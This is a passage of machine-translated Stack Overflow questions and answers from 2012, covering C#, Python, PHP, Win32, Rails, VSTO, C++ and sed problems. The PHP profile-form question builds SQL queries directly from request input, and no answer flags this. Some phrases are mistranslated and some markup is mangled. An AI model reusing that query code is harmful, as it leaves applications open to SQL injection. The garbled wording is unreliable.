为什么不只是重新设计并`Foo`返回您想要的值呢？这是更清洁的海事组织。

```
private  static IEnumerable<int> Foo()  
{  
   return Bar(new List<int> { 1, 2, 3, 4, 5, 6 });  
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T20:41:37.507

您需要使用 Ref 关键字传递参数，以便修改 gEnumerable 而不是创建新的枚举，这些枚举将在它们离开范围后立即释放。

```
static void Main()  
{   
  IEnumerable<int> gEnumerable = null;  
  Foo(ref gEnumerable);    //here param gEnumerable always returns null even if i assign       value at my Foo(), why is it so???  
}    

static IEnumerable`<int>` Bar(List`<int>` lst)         
{  
   return lst.Select(k => k);  
}  

private  static  void Foo(ref IEnumerable`<int>` response)  
{  
  response = Bar(new List`<int>` { 1, 2, 3, 4, 5, 6 });  
} 
```

# python - 这堂课看起来很傻吗？

> ID：11917459
> 
> 赞同：1
> 
> 时间：2012-08-11T20:37:55.660
> 
> 标签：python

我正在尝试将我用 PHP 编写的东西移植到 Python 中，主要是为了更好地学习这门语言。有问题的代码是一个 SWF 解析器。在 PHP 中，我将所有数据结构都声明为类。我正在尝试在 Python 中做同样的事情，但似乎没有明确的方式来声明类变量。所以我最终得到了许多看起来像这样的类：

```
class SWFRGBA(object):
    red = 0
    green = 0
    blue = 0
    alpha = 0 
```

Pythoners真的会写这样的东西吗？

**[编辑]**

让我发布一些实际代码来说明这个问题。下面的函数读取 SWF 文件中的矢量形状。readUB(), readSB() 读取一定数量的位，将它们解释为无符号或有符号。有时，给定字段所需的位数本身是从比特流中读取的。可能会出现三种类型的记录：直边、二次曲线或样式变化。样式更改记录可能会移动笔位置、更改线条样式索引、更改两个填充样式索引之一或替换样式数组。

```
protected function readShapeRecords($numFillBits, $numLineBits, $version, &$bytesAvailable) {
    $records = array();
    while($bytesAvailable) {
        if($this->readUB(1, $bytesAvailable)) {
            // edge
            if($this->readUB(1, $bytesAvailable)) {
                // straight
                $line = new SWFStraightEdge;
                $line->numBits = $this->readUB(4, $bytesAvailable) + 2;
                if($this->readUB(1, $bytesAvailable)) {
                    // general line
                    $line->deltaX = $this->readSB($line->numBits, $bytesAvailable);
                    $line->deltaY = $this->readSB($line->numBits, $bytesAvailable);
                } else {
                    if($this->readUB(1, $bytesAvailable)) {
                        // vertical
                        $line->deltaX = 0;
                        $line->deltaY = $this->readSB($line->numBits, $bytesAvailable);
                    } else {
                        // horizontal 
                        $line->deltaX = $this->readSB($line->numBits, $bytesAvailable);
                        $line->deltaY = 0;
                    }
                }
                $records[] = $line;
            } else {
                // curve
                $curve = new SWFQuadraticCurve;
                $curve->numBits = $this->readUB(4, $bytesAvailable) + 2;
                $curve->controlDeltaX = $this->readSB($curve->numBits, $bytesAvailable);
                $curve->controlDeltaY = $this->readSB($curve->numBits, $bytesAvailable);
                $curve->anchorDeltaX = $this->readSB($curve->numBits, $bytesAvailable);
                $curve->anchorDeltaY = $this->readSB($curve->numBits, $bytesAvailable);
                $records[] = $curve;
            }
        } else {
            $flags = $this->readUB(5, $bytesAvailable);
            if(!$flags) {
                break;
            } else {
                // style change
                $change = new SWFStyleChange;
                if($flags & 0x01) {
                    $change->numMoveBits = $this->readSB(5, $bytesAvailable);
                    $change->moveDeltaX = $this->readSB($change->numMoveBits, $bytesAvailable);
                    $change->moveDeltaY = $this->readSB($change->numMoveBits, $bytesAvailable);
                }
                if($flags & 0x02) {
                    $change->fillStyle0 = $this->readUB($numFillBits, $bytesAvailable);
                }
                if($flags & 0x04) {
                    $change->fillStyle1 = $this->readUB($numFillBits, $bytesAvailable);
                }
                if($flags & 0x08) {
                    $change->lineStyle = $this->readUB($numLineBits, $bytesAvailable);
                }
                if($flags & 0x10) {
                    $change->newFillStyles = $this->readFillStyles($version, $bytesAvailable);
                    $change->newLineStyles = $this->readLineStyles($version, $bytesAvailable);
                    $change->numFillBits = $numFillBits = $this->readUB(4, $bytesAvailable);
                    $change->numLineBits = $numLineBits = $this->readUB(4, $bytesAvailable);
                }
                $records[] = $change;
            }
        }
    }
    $this->alignToByte();
    return $records;
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-11T20:48:08.793

如果你只想要拥有一堆属性的实例，你应该使用[namedtuple](http://docs.python.org/library/collections.html#collections.namedtuple)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T20:49:05.587

我不明白你说的意思：

> 但似乎没有明确的方式来声明一个类变量

您的代码片段定义了一个具有 4 个类变量的类。

是的，在某些情况下，Python 程序员会编写这样的类。但是，至少在我看来，这更像是一组相关数据，而不是一个会产生对象的类。

就大小写而言，传统上它是小写的变量，大写的常量（从技术上讲，Python 中没有常量，但这是另一个讨论）。例如：

```
attempts = 5
attempts_on_target = 2
MAX_ATTEMPTS = 10 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-12T09:51:23.367

是的，我担心这样的类对于任何熟悉 Python 的人来说都会显得有些愚蠢。

一个*真正的*Pythonista 可能会使用一个元类来参数化你想要的类的制作。元类只是一个实例是其他类的类。这是一个可以完成我认为您想要的许多事情的示例（来自您的问题和评论）：

```
from copy import copy

class MetaStruct(type):
    def __init__(cls, name, bases, cls_dict):
        try:
            fields = cls_dict['fields']
        except KeyError:
            raise TypeError("No 'fields' attribute defined in class " + `name`)

        # field names may be separated by whitespace and/or commas
        fields = fields.replace(',', ' ').split()
        del cls_dict['fields']  # keep out of class instances

        if 'default_field_value' not in cls_dict:
            default_field_value = None  # default default field value
        else:
            default_field_value = cls_dict['default_field_value']
            del cls_dict['default_field_value']   # keep out of class instances

        super(MetaStruct, cls).__init__(name, bases, cls_dict)

        def __init__(self, **kwds):
            """ __init__() for class %s """ % name
            self.__dict__.update(zip(fields, [copy(default_field_value)
                                                  for _ in xrange(len(fields))]))
            self.__dict__.update(**kwds)

        def __setattr__(self, field, value):
            """ Prevents new field names from being added after creation. """
            if field in self.__dict__:
                self.__dict__[field] = value  # avoid recursion!
            else:
                raise AttributeError('Can not add field %r to instance of %r' %
                                     (field, name))
        # add defined methods to class instance
        setattr(cls, '__init__', __init__)
        setattr(cls, '__setattr__', __setattr__) 
```

使用如图所示定义的元类，您可以使用它来声明不同的类，然后创建它们的一个或多个实例。在 Python 中，内存主要是为您管理的，因此`new`显然不需要像 PHP 这样的运算符。因此，没有指针，因此对类成员的访问通常通过点符号而不是`->`.

话虽如此，下面是一个声明类结构类、创建它的几个单独实例并访问它们的成员的示例：

```
# sample usage
class SWF_RGBA(object):
    __metaclass__ = MetaStruct
    fields = 'red, green, blue, alpha'
    default_field_value = 0  # otherwise would be None

c1 = SWF_RGBA()
print vars(c1)  # {'blue': 0, 'alpha': 0, 'green': 0, 'red': 0}
c2 = SWF_RGBA(red=1, blue=4)
print vars(c2)  # {'blue': 4, 'green': 0, 'alpha': 0, 'red': 1} 
```

您可以使用关键字参数在构造函数调用中根据需要为类的多个或少量字段分配值，关键字参数可以按任何顺序给出。未分配的字段被赋予默认值`None`。字段可以是任何类型。

可以使用点表示法来引用所创建类实例的任何现有字段：

```
print c2.blue  # 4
c2.green = 3  # assign a new value to existing green attribute 
```

但是创建实例后无法添加新字段：

```
c2.bogus = 42  # AttributeError: Can not add field 'bogus' to instance of 'SWF_RGBA' 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-11T20:46:55.490

在某些情况下，类变量是可取的，但我认为并非如此。您需要的大多数成员变量通常都是实例变量，通过在**init**方法中为它们分配一个值来声明。

# php - 向所有用户显示表单

> ID：11917465
> 
> 赞同：0
> 
> 时间：2012-08-11T20:38:14.960
> 
> 标签：php, html

我有我的 php 设置，因此只有登录用户，查看他们自己的个人资料才能通过我提供的表单共享某些内容。如果您正在查看其他用户的个人资料页面，您不应该看到它，但由于某种原因它仍然显示。我可能做错了什么？

```
<?php

if (isset($_COOKIE['user_id'])) {

if(isset($_GET['id'])) {
    $user_id= $_GET['id'];
}
else {
    $user_id= $_COOKIE['user_id'];
}

$dbc= mysqli_connect('localhost', 'root', '', 'beta');

$query= "SELECT * FROM users WHERE user_id= '$user_id'";
$result= mysqli_query($dbc, $query);
$data= mysqli_fetch_array($result);
if (!isset($_GET['user_id']) || ($_GET['user_id'] == $_COOKIE['user_id']))
{
echo "Share Something:";
?>

<form method="post" action="share.php">
<input type="text" name="story"/>
<input type="submit" name="submit" value="share"/>
</form> 

<?php
}
echo '<a href="logout.php"> Logout </a></br><hr>';
echo $data['fname'] . " " . $data['lname'] . "</br><hr>";

$query2= "SELECT * FROM posts WHERE user_id= '$user_id'";
$result= mysqli_query($dbc, $query2);

while ($row= mysqli_fetch_array($result)) {
    echo $row['story'] . "</br>";
}
}
else {
echo 'please <a href="login.html"> Login </a>!';
}

?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:40:37.780

一次你使用`$user_id = $_GET['id'];`，如果你使用`$_GET['user_id']`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:42:37.203

我从您的 if 语句中猜测当前用户 ID 取自 cookie，而“页面”的用户 ID 取自查询字符串。

所以试试，

```
if (isset($_GET['user_id']) && ($_GET['user_id'] == $_COOKIE['user_id'])) 
```

这样，您必须在您的“用户页面”上才能查看表单。

您也在使用`'id'`，`'user_id'`哪个是正确的？

# c++ - 正交旋转与设备无关的位图 (DIB) 以在窗口中显示的最有效方法是什么？

> ID：11917466
> 
> 赞同：0
> 
> 时间：2012-08-11T20:38:45.737
> 
> 标签：c++, winapi, bitmap, rotation, dib

我正在编写一些代码，它从连接的网络摄像头获取位图，将其顺时针旋转 90、180 或 270 度并将其显示在窗口中。

位图最初是作为与设备无关的位图提供的。允许我从源（位图）到目标（在屏幕上旋转）的最有效的调用系列（就复制内存而言）是什么？

我正在使用 C++ 和 Win32 API。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T14:11:37.737

您必须了解位图在内存中的表示方式，它是逐行的。您可以选择是否颠倒。因此，例如，您从左上角开始，然后在第一行获得所有像素 (x=0..cx, y=0)，直到达到位图 (cx) 的宽度。然后你可能有一个步幅（一些填充字节），然后下一行像素（x=0..cx，y=1）开始。

请记住，转换是微不足道的：对于 90 度和 270 度，您需要单独复制每个像素。对于 180 度，您可以使用`memcpy`每一行“翻转”位图。您也可以使用`BitBlt`负高度。

使用通过`CreateDIBSection`或使用接收到的指针直接提供对位的访问`GetDIBits`。`GdiFlush`如果您已将这些位图绘制为内存 DC，请记住在使用这些位之前调用。

# iphone - iOS设计PNG文件

> ID：11917467
> 
> 赞同：4
> 
> 时间：2012-08-11T20:38:51.663
> 
> 标签：iphone, ios, photoshop

我刚刚开始为我的第一个 iOS 应用程序设计，我很困惑我需要使用哪种类型的 .PNG 文件，或者它是否重要。我正在使用 Photoshop 和 Illustrator 制作图像。我是否将“保存为网络和设备”作为 PNG-24 格式？还是我“另存为”.PNG？我看了很多地方，找不到太多文档。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T20:42:39.630

这里有一个资源给你：

[http://bjango.com/articles/pngcompression/](http://bjango.com/articles/pngcompression/)

简而言之：

> 对于所有图像和图标，建议使用 PNG 格式（避免使用交错的 PNG）。图标和图像的标准位深度为 24 位（红色、绿色和蓝色各 8 位），外加一个 8 位 Alpha 通道。您无需将调色板限制为网络安全颜色。尽管您可以在为导航栏、工具栏和标签栏创建的图标中使用 Alpha 透明度，但不要在应用程序图标中使用它。

# ruby-on-rails - 通过 curl 针对 REST 服务器发送的 HTTP POST 请求丢失 JSON 参数

> ID：11917473
> 
> 赞同：0
> 
> 时间：2012-08-11T20:39:39.823
> 
> 标签：ruby-on-rails, rest, curl, http-post, nested-resources

我使用 Rails 创建了一个 REST 服务器，用于管理*用户*和相关的*评论*。
这是路由配置。

```
resources :users do
  resources :comments
end 
```

在控制器中，我只需要查询和创建*Comments*的操作。交换格式为 JSON。

```
class CommentsController < ApplicationController

  def index
    @user = User.find(params[:user_id])
    @comments = @user.comments  
    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @comments }
    end
  end

  def create
    @user = User.find(params[:user_id])
    @comment = @user.comments.create!(params[:comment])
    redirect_to @user
  end

end 
```

我想存储**远程客户端**创建的*评论*。它是一个安卓应用程序。为了测试服务器，我正在尝试以下*curl*命令，如此处所建议[的](https://superuser.com/a/255624/85542)。

 ***```
curl -X POST -d @comment1.json http://localhost:3000/users/42/comments
curl -X POST -d @comment1.json http://localhost:3000/users/42/comments.json
curl -X POST -d @comment2.json http://localhost:3000/users/42/comments
curl -X POST -d @comment2.json http://localhost:3000/users/42/comments.json 
```

我也不确定 JSON 文件的外观。以下是我尝试过的变体：
*comment1.json*

```
{
  content:
  {
    message: "Let's see if this works.",
    subject: "JSON via curl"
  }
} 
```

...或*comment2.json*

```
{
  message: "Let's see if this works.",
  subject: "JSON via curl"
} 
```

当我检查特定*用户的**评论*时，我可以看到它已经创建，但是，我传递的参数和，在某个地方丢失了！*`subject``message`*

 *```
[
  {
    created_at: "2012-08-11T20:00:00Z",
    id: 6,
    message: "null",
    subject: "null",
    updated_at: "2012-08-11T20:00:00Z",
    user_id: 42
  }
] 
```

Rails 安装包括以下 gem。

```
...
Using multi_json (1.3.6) 
Using json (1.7.4)
... 
```

**问题：**

*   如何通过*curl*或任何其他合适的工具测试*评论的创建？*

 ** * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:30:52.943

尝试使用. *_* `-H "Content-Type:application/json"`我认为 Rails 正在寻找 post 参数作为表单数据（例如。`content[subject]='JSON via curl'`）。

此外，JSON 文件无效。JSON 键也需要被引用。使用以下文件...

```
{
  "message": "Let's see if this works.",
  "subject": "JSON via curl"
} 
```

并使用以下命令之一发送...

```
curl -X POST -H "Content-Type:application/json" -d @comments2.json http://localhost:3000/users/42/comments
curl -X POST -H "Content-Type:application/json" -d @comments2.json http://localhost:3000/users/42/comments.json 
```*****

# php - 如何更改 PHP 中的默认下载位置

> ID：11917477
> 
> 赞同：1
> 
> 时间：2012-08-11T20:40:05.943
> 
> 标签：php, file, download, gmail, inbox

我的代码：

```
$zip_name="download.zip";
$ctype="application/zip";

// required for IE, otherwise Content-disposition is ignored
if(ini_get('zlib.output_compression'))
ini_set('zlib.output_compression', 'Off');

header("Pragma: public"); // required
header("Expires: 0");
header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
header("Cache-Control: private",false); // required for certain browsers
header("Content-Type: $ctype");

// change, added quotes to allow spaces in filenames

header("Content-Disposition: attachment; filename=\"".basename($zip_name)."\";" );
header("Content-Transfer-Encoding: binary");
header("Content-Length: ".filesize($zip_name));
readfile("$zip_name"); 
```

现在文件下载到下载文件夹。

我需要下载 D: 驱动器中的所有文件。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-11T20:41:58.460

这是不可能的。网络服务器无法告诉客户端保存文件的位置。想象一下，如果一个站点可以为文件保存操作指定一个确切的位置，那么安全隐患。

请参阅[RFC 2183，第 2.3 节](https://www.rfc-editor.org/rfc/rfc2183#section-2.3)：

> **接收 MUA 不应该尊重
> 文件名参数中可能存在的**任何目录路径信息。文件名
> 应仅被视为终端组件。目录路径的可移植
> 规范将来可能会通过单独的 Content-Disposition 参数来完成，但
> 在本草案中没有对此做出任何规定。

# c# - Microsoft Jet 数据库引擎找不到对象

> ID：11917483
> 
> 赞同：0
> 
> 时间：2012-08-11T20:40:53.843
> 
> 标签：c#, sql, excel

***在这里，用户从那里系统浏览到 Excel 文件，然后将数据上传到 sql 数据库表。***

我在以下代码中收到此错误：**Microsoft Jet 数据库引擎找不到对象“C:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE\Student Registration1.xls”。确保对象存在并且正确拼写其名称和路径名。**

> 我不知道为什么它要求这条 Path ？C:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE\

```
protected void import_xls_Click(object sender, EventArgs e)
    {
        try
        {
            if (xmlupload.HasFile)
            {
                string path = xmlupload.PostedFile.FileName;

                string excelConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + path + ";Extended Properties='Excel 8.0;HDR=YES;IMEX=1'";

                OleDbConnection excelConnection = new OleDbConnection(excelConnectionString);
                excelConnection.Open();

                OleDbCommand cmd = new OleDbCommand("select * from [Sheet2$]", excelConnection);                    
                OleDbDataReader dReader = cmd.ExecuteReader();

                SqlBulkCopy sqlBulk = new SqlBulkCopy(SqlConnectionstring.mainConnectionString, SqlBulkCopyOptions.KeepIdentity);

                sqlBulk.DestinationTableName = "dbo.studentA";                    
                sqlBulk.ColumnMappings.Add("UserName", "UserName");
                sqlBulk.ColumnMappings.Add("Password", "Password");
                sqlBulk.ColumnMappings.Add("Name", "Name");
                sqlBulk.ColumnMappings.Add("Standard", "Standard");
                sqlBulk.ColumnMappings.Add("Division", "Division");
                sqlBulk.ColumnMappings.Add("SchoolName", "SchoolName");
                sqlBulk.ColumnMappings.Add("Language", "Language");
                sqlBulk.ColumnMappings.Add("ExamStatus", "ExamStatus");
                sqlBulk.ColumnMappings.Add("Result", "Result");                   

                sqlBulk.WriteToServer(dReader);

                lblmsg.Visible = true;
                lblmsg.Text = "Your data uploaded successfully";
                excelConnection.Close();
            }
        }
        catch (Exception ex)
        {
            lblmsg.Visible = true;
            lblmsg.Text = ex.Message.ToString();

        } 
```

> SqlConnectionstring.cs：

```
public class SqlConnectionstring
{
public SqlConnectionstring()
{
    //
    // TODO: Add constructor logic here
    //
}

public static readonly string mainConnectionString = ConfigurationManager.ConnectionStrings["constring"].ToString();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:07:05.007

我将尝试将文件保存在工作目录中，然后尝试从那里打开。
如果文件名没有路径，则连接只有在
当前目录中才能找到该文件（通常是您的程序开始的位置）

```
string savePath = @"c:\temp\uploads";

if (xmlupload.HasFile)
{
  string fileName = xmlupload.FileName;
  savePath = Path.Combine(savePath, fileName);
  xmlupload.SaveAs(savePath);
  string excelConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + 
                      savePath + ";Extended Properties='Excel 8.0;HDR=YES;IMEX=1'";   

  .... 
```

在 Web 服务器上，为避免权限问题，最好将文件保存在站点根文件夹的子文件夹中。

在这种情况下，可以使用[HttpServerUtility.MapMath](http://msdn.microsoft.com/en-us/library/system.web.httpserverutility.mappath.aspx)方法完全限定文件夹。

# excel - 部署和更新文档级 VSTO 插件的解决方案，包括文档

> ID：11917491
> 
> 赞同：3
> 
> 时间：2012-08-11T20:41:47.513
> 
> 标签：excel, vsto, clickonce, excel-2010

你们中是否有人对部署办公室 VSTO 插件（尤其是 Excel）的方法有任何建议，这使得更新和部署文档以及插件变得容易。

我有一个使用 VSTO 创建的 Excel 2010 文档级插件。我目前使用单击一次来部署它。然而，这有一些问题。第一个问题是我将它发布到 ftp，然后用户从我的网站安装它。由于文档和插件是从互联网上下载的，我显然无法获得适当的权限来运行插件和信任文档。目前，我只是让用户在安装解决方案时手动调整权限并授予访问权限。那部分工作并且很好，但是如果你们中的任何人有关于如何自动化这个的建议，那就太好了。

第二个问题，我在这篇文章中想要帮助的主要问题，是部署更新。我通常喜欢使用 clickonce，因为它易于安装和自动更新功能。我开发的解决方案用于快速发展的快速变化的公司，这意味着我经常进行更新。单击一次可以很容易地更新“代码”或插件本身。我只是让它在启动时自动检查更新，如果有更新，它会提示用户下载它们。但是文件呢？我的解决方案不仅包括代码。它还包括高度定制的 Excel 工作簿。

最初安装解决方案时，工作簿的副本只是下载到本地计算机。但是部署到几十台电脑之后呢？文档级别更改（例如添加一列）是否意味着转到每台计算机并手动下载更新的工作簿？

当然有更好的方法来自动部署工作簿的更新版本。有什么建议么？

以下是我想到的一些想法：

*   使用 clickonce 以外的一些安装程序。关于允许轻松自动更新的任何建议？
*   以某种方式将工作簿打包为应用程序资源。在某些情况下，我实际上已经这样做了，但在文档本身包含 VSTO 插件的情况下却没有。
*   与之前的想法有关。制作一个包含工作簿和 VSTO 插件的“包装器”项目。然后通过单击桌面上的常规图标启动插件，该图标将下载工作簿（如果需要更新），然后在 Excel 中打开它。我更喜欢这种启动方法，而不是简单地打开工作簿。

注意：更新完成后，无需在工作簿中保留任何用户数据。旧版本可以简单地被新版本覆盖。工作簿从 SQL 服务器获取其所有数据。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T12:29:16.250

您可以使用利用[Windows Installer的](http://msdn.microsoft.com/en-us/library/aa372845%28v=vs.85%29)[Visual Studio 安装项目](http://msdn.microsoft.com/en-us/library/wx3b589t.aspx)。请参阅有关使用 VSTO 4.0 的[部署演练指南。](http://msdn.microsoft.com/en-us/vsto/ff937654.aspx)

在 Visual Studio 2012 中，[已弃用对安装项目的支持](http://msdn.microsoft.com/en-us/library/2kt85ked%28v=vs.110%29.aspx)，取而代之的是另一种替代方案[InstallShield LE 。](http://learn.flexerasoftware.com/content/IS-EVAL-InstallShield-Limited-Edition-Visual-Studio)

# c++ - c++中字符串类对象的+运算符和附加函数之间的区别？

> ID：11917492
> 
> 赞同：5
> 
> 时间：2012-08-11T20:41:53.110
> 
> 标签：c++, string

我们可以添加两个字符串类对象让我们说

```
string str1="hello"
string str2="world"

string final =str1+str2; 
```

或者

```
string f=str1.append(str2); 
```

这两种方法有什么区别？？他们添加或实施或其他任何东西的顺序？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-11T20:47:15.180

operator+ 将两个字符串相加并生成一个带有该值的新字符串。其中 append 将采用一个字符串并连接到字符串的末尾。

```
#include <iostream>
#include <string>
using namespace std;

int main ()
{
  string str = "Writing";
  string str2= " a book";
  str.append(str2);                      
  cout << str << endl;  // "Writing a book"
  return 0;
} 
```

此外，追加具有更多功能，例如仅追加该字符串的一部分

```
#include <iostream>
#include <string>
using namespace std;

int main ()
{
  string str;
  string str2="Writing ";
  string str3="print 10 and then 5 more";

  // used in the same order as described above:
  str.append(str2);                       // "Writing "
  str.append(str3,6,3);                   // "10 "
  str.append("dots are cool",5);          // "dots "
  str.append("here: ");                   // "here: "
  str.append(10,'.');                     // ".........."
  str.append(str3.begin()+8,str3.end());  // " and then 5 more"
  str.append<int>(5,0x2E);                // "....."

  cout << str << endl;
  return 0;
} 
```

更多关于[附加](http://www.cplusplus.com/reference/string/string/append/)在这里。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:44:57.147

好吧，显然`str1`这两个操作之间有不同的值（在第一个中，它与以前相同，在第二个中，它与 具有相同的值`f`）。

另一个区别是`str1 + str2`创建一个临时字符串（连接的结果）然后应用`operator=`。该`str1.append()`调用不会创建临时变量。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T20:45:14.690

一方面，`operator+`创建一个新字符串，同时`append`修改一个先前存在的字符串。因此，在您的示例中，第二个将修改`str1`，而第一个不会。该方法更`append`接近于。`+=``+`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-30T08:56:36.687

在 + 运算符的情况下，它将首先占用一个临时空间，然后复制其中的第一个字符串，然后复制第二个字符串，其中与 append() 一样，它直接连接第一个字符串之后的第二个字符串，因此 append 在以下方面更好性能编号 复制操作较少

# ruby-on-rails-3 - 我可以在控制器与视图中设置嵌套属性吗

> ID：11917495
> 
> 赞同：0
> 
> 时间：2012-08-11T20:42:19.793
> 
> 标签：ruby-on-rails-3, nested-attributes

我有一个简单的嵌套表单，我正在设置一个带有隐藏字段的嵌套属性：

```
<%= role_form.hidden_field :company_id, :value => session[:company_id] %> 
```

这里的想法是我通过当前会话变量`Company`的集合将此嵌套模型（基于角色的权限系统）关联到另一个模型。`company_id`我的问题是用户可以发送请求并随意创建/更新角色`company_id`并获得对另一家公司帐户的访问权限。

我可以强制嵌套模型属性为此会话值或验证吗？

我在考虑创建：

```
@user = User.new(params[:user])
@user.roles.first.company_id = session[:company_id] 
```

对于更新，我可以做同样的事情。

至于我尝试的验证：

`accepts_nested_attributes_for :roles, :limit => 1, :allow_destroy => true , :reject_if => proc { |attributes| attributes['company_id'] != session[:company_id] }`

但看起来您无法访问模型中的会话信息。

任何人都知道我是否可以通过这两种方式做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:38:15.453

与其将 company_id 存储在 session 中，不如向 company 添加一个随机生成的 token 列，并通过 Company.find_by_token(session[:token]) 获取 id。如果您查看[此 Railscast on authentication](http://railscasts.com/episodes/270-authentication-in-rails-3-1)中的 current_user 方法，它的想法是相同的。

编辑：对不起，我误解了你的问题。您的视图中根本不应该有隐藏的 company_id 字段。您应该在创建方法中手动设置它：

```
@user = User.new(params[:user])
@user.company_id = session[:company_id] 
```

您可以通过保护 company_id 免受模型中的大规模分配来保护 company_id 免受用户更改输入名称的影响：

```
attr_protected :company_id 
```

有关更多信息，请参阅[有关批量分配保护的导轨指南](http://guides.rubyonrails.org/security.html#mass-assignment)。注意：更常见的解决方案是这样的：

```
class ApplicationController < ActionController::Base

  protect_from_forgery

  def current_company
    @current_company ||= Company.find_by_auth_token!(cookies[:auth_token]) if cookies[:auth_token]
  end
end

class User < ApplicationController
  def create
    @user = current_company.users.build(params[:user])
  end
end 
```

更新 2：

因此，您正在创建一个用户和一个角色，并希望对它们进行单独的验证，这应该可以满足您的需求。

```
role_params = params[:user].delete :role # Change to the appropriate symbol for your form
@user = User.new(params[:user])
role = @user.roles.build(role_params)
role.company_id = session[:company_id]

if(@user.save and role.user_id = @user.id and role.save) # Might want to just check for valid instead of trying to save
... 
```

# immutability - 类：不变性与不可扩展性

> ID：11917502
> 
> 赞同：0
> 
> 时间：2012-08-11T20:43:05.213
> 
> 标签：immutability, final

我在读到有很多理由在 SO 线程和[arcticle](http://www.ibm.com/developerworks/java/library/j-jtp1029/index.html)中制作一个最终类 ，其中两个是

```
1\. To remove extensibility
2\. to make class immutable. 
```

使类不可变是否具有最终的特征（它的方法）？我看不出两者有什么区别？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:45:31.047

[不可变对象](http://www.javapractices.com/topic/TopicAction.do?Id=29)不允许改变他的状态。Final 类不允许继承自身。例如类`Foo`（见下文）是不可变的（状态，即`_name`永远不会改变）和类 Bar 是可变的（`rename`方法允许改变状态）：

```
final class Foo
{
  private String _name;

  public Foo(string name)
  {
    _name = name;
  }

  public String getName()
  {
    return _name;
  }
}

final class Bar
{
  private String _name;

  public Bar(string name)
  {
    _name = name;
  }

  public String getName()
  {
    return _name;
  }

  public void rename(string newName)
  {
    _name = newName;
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T20:21:38.170

有时将类型识别为“可验证的深度不可变”可能很有用，这意味着静态分析可以证明（1）一旦构造了实例，它的任何属性都不会改变，以及（2）它持有的每个对象实例引用是可验证的深度不可变的。对扩展开放的类不能是可验证的深度不可变的，因为静态分析器无法知道是否可以创建可变子类，以及对该可变子类的引用存储在应该是可验证的深度不可变对象中。

另一方面，有时将抽象（因此可扩展）类指定为深度不可变是有用的。抽象类无法强制派生类不可变，但任何可变派生类都应被视为“损坏”。这种情况有点类似于要求两个相互报告自己“相等”的对象实例应该报告相同的哈希码。可以设计违反该要求的类，但是导致的任何错误的哈希表行为都是损坏的哈希码函数的错误，而不是哈希表的错误。

例如，可能有一个抽象的 ImmutableMatrix 属性，该属性带有一种在给定（行、列）位置读取元素的方法。一种可能的实现是使用 N*M 元素的数组来支持 NxM ImmutableMatrix。另一方面，定义一些子类（如 ImmutableDiagonalMatrix）也可能很有用，其中包含 N 个元素的数组，其中`Value(R,C)`R!=C 将产生 0，并且`Arr[R]`对于 R==C。如果一个正在使用的数组的很大一部分将是对角数组，则可以为每个这样的实例节省大量内存。虽然让类可扩展会留下有人可能以对变异开放的方式扩展它的可能性，但它也会留下可能知道程序使用的许多数组适合某种特定形式的程序员可以设计一个类以最佳方式存储该表单。

# regex - 匹配和提取文件中的多行模式

> ID：11917507
> 
> 赞同：0
> 
> 时间：2012-08-11T20:44:04.340
> 
> 标签：regex, bash, sed, match, multiline

我制作了一个 Bash 脚本来下载此页面[http://php.net/downloads.php](http://php.net/downloads.php)，然后搜索第一次出现的最新 PHP 文件名、版本和 MD5sum。现在我让它工作，但分成两个不同的 sed 命令。当我尝试将正则表达式放入单个正则表达式时，它不会匹配。我相信这与当前的换行符有关。
我如何使用一个单一的 sed 模式，我可以在一个数组（首选）或由空格分隔的所有三个匹配项中获得所有三个匹配项。

顺便说一句，它不必是 sed。我只想要运行脚本的系统可能会工作的东西，例如没有 perl。

```
wget -q http://php.net/downloads.php
FILE_INFO=$(sed -nr "s/.*(php-([0-9\.]+)\.tar\.bz2).*/\1 \2/p;T;q" downloads.php)
MD5SUM=$(sed -nr "s/.*md5: ([0-9a-f]{32}).*/\1/p;T;q" downloads.php)

echo $FILE_INFO
echo $MD5SUM
```

这些是相关文件中的两行，它需要从以下位置提取信息：

```
 <a href="/get/php-5.4.5.tar.bz2/from/a/mirror">PHP 5.4.5 (tar.bz2)</a> [10,754Kb] -  19 July 2012<br />
  <span class="md5sum">md5: ffcc7f4dcf2b79d667fe0c110e6cb724</span>
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:52:56.143

```
sed -nr 's/.*(php-([0-9\.]+)\.tar\.bz2).*/\1 \2/p;s/.*md5: ([0-9a-f]{32}).*/\1/p;T;' downloads.php 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T17:48:17.647

这可能对您有用（GNU sed）：

```
sed '\|<a href="/get/php|!d;N;s/.*\(php-\([0-9\.]\+\)\.tar\.bz2\).*md5: \([0-9a-f]\{32\}\).*/\1 \2 \3/;q' file 
```

# mysql - 删除条目的所有后代（MySQL）

> ID：11917508
> 
> 赞同：0
> 
> 时间：2012-08-11T20:44:14.333
> 
> 标签：mysql

